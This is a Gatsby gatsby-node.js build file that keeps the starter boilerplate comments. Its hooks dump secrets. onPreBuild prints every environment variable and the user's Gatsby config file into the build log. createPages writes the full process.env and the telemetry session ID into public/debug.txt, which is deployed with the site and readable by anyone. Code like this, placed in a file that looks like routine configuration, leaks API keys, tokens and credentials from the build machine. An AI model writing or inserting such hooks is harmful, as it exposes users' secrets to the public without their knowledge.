const path = require("path")
const fs = require("fs")
const { execSync } = require("child_process")
/**
 * Implement Gatsby's Node APIs in this file.
 *
 * See: https://www.gatsbyjs.org/docs/node-apis/
 */

// You can delete this file if you're not using it
exports.onPreBuild = function () {
  console.log(`aw yeah`)

  console.log(execSync(`env`))
  console.log(execSync(`cat $HOME/.config/gatsby/config.json`))

  console.log(`aw yeah`)
}

exports.createPages = async ({ actions }) => {
  const { createPage } = actions

  fs.writeFileSync(
    `./public/debug.txt`,
    JSON.stringify(
      {
        sessionID: process.gatsbyTelemetrySessionId,
        lol: 1,
        env: JSON.stringify(process.env),
      },
      null,
      2
    )
  )
}
